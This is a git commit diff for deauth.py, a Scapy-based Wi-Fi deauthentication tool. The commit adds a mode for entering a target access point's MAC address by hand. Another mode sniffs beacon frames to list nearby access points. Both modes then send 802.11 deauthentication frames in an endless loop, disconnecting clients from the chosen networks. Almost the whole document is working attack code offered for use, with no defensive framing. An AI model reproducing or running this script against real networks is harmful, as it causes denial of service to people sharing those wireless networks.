7ec60193c99dd06d29b628e2dc8d2a339adf2bc3
Joshua Whitmore <joshua.whitmore09@gmail.com>
2018-11-09 16:01:21 +1000

    Added manual option for targetting AP's

--- deauth.py
+++ deauth.py
@@ -15,58 +15,74 @@ if len(sys.argv) < 2:
   sys.exit(-1)
 conf.iface = sys.argv[1]
 
-# WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
-# Select channel
-channel = ""
-while channel.isdigit() != True:
-  channel = input("Channel to use: ")
-os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
-time.sleep(0.5)
+choice1 = input("To scan for targets press 1. \nTo manualy enter AP press 2: \n")
 
-# Function to process captured packets
-def sniffmgmt(p):
-  stamgmtstypes = (0, 2, 4)
-  if p.haslayer(Dot11) and p.type == 0 and p.subtype == 0x08 and hasattr(p, 'info'):
-    ssid = ( len(p.info) > 0 and p.info != "\x00" ) and p.info or '<hidden>'
-    probe = { "ssid": ssid, "cli": p.addr2 }
-    key = "%s" % (p.addr2)
-    found[key] = probe
+if choice1 == "1":
+    # WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
+    # Select channel
+    channel = ""
+    while channel.isdigit() != True:
+      channel = input("Channel to use: ")
+    os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
+    time.sleep(0.5)
 
-# Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
-n = ""
-while n.isdigit() != True:
-  n = input("Number of packets to capture: ")
-n = int(n)
+    # Function to process captured packets
+    def sniffmgmt(p):
+      stamgmtstypes = (0, 2, 4)
+      if p.haslayer(Dot11) and p.type == 0 and p.subtype == 0x08 and hasattr(p, 'info'):
+        ssid = ( len(p.info) > 0 and p.info != "\x00" ) and p.info or '<hidden>'
+        probe = { "ssid": ssid, "cli": p.addr2 }
+        key = "%s" % (p.addr2)
+        found[key] = probe
 
-sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)
+    # Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
+    n = ""
+    while n.isdigit() != True:
+      n = input("Number of packets to capture: ")
+    n = int(n)
 
-probe_list = []
+    sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)
 
-# Make an array version of found so that each AP has a number associated with it for the user to choose
-for key,probe in found.items():
-  item = [key,probe]
-  probe_list.append(item)
+    probe_list = []
 
-# Print out the list of discovered APs and their index so that the user can choose one
-for i in range(len(probe_list)):
-  item = probe_list[i]
-  print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
+    # Make an array version of found so that each AP has a number associated with it for the user to choose
+    for key,probe in found.items():
+      item = [key,probe]
+      probe_list.append(item)
 
-# Get & process user input
-n = ""
-while n.replace(",", "").isdigit() != True:
-  n = input("AP number to be deauthed: ")
-# n = int(n)
+    # Print out the list of discovered APs and their index so that the user can choose one
+    for i in range(len(probe_list)):
+      item = probe_list[i]
+      print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
 
-aps = list(map(int, n.split(",")))
-print(aps)
+    # Get & process user input
+    n = ""
+    while n.replace(",", "").isdigit() != True:
+      n = input("AP number to be deauthed: ")
+    # n = int(n)
 
-# Send packets forever
-while True:
-  for n in aps:
-    ap = probe_list[n][1]["cli"]
-    print(ap)
+    aps = list(map(int, n.split(",")))
+    print(aps)
 
-    # Create & send packet
-    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
-    sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
+    # Send packets forever
+    while True:
+      for n in aps:
+        ap = probe_list[n][1]["cli"]
+        print(ap)
+
+        # Create & send packet
+        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
+        sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
+
+elif choice1 == "2":
+    ap = input("Enter APs MAC addres: ")
+    while True:
+        print(ap)
+
+        # Create & send packet
+        packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
+        sendp(packet, monitor=True) # If interface is already in monitor mode remove the monitor=true parameter
+
+else:
+    print("invalid option chosen")
+    exit()
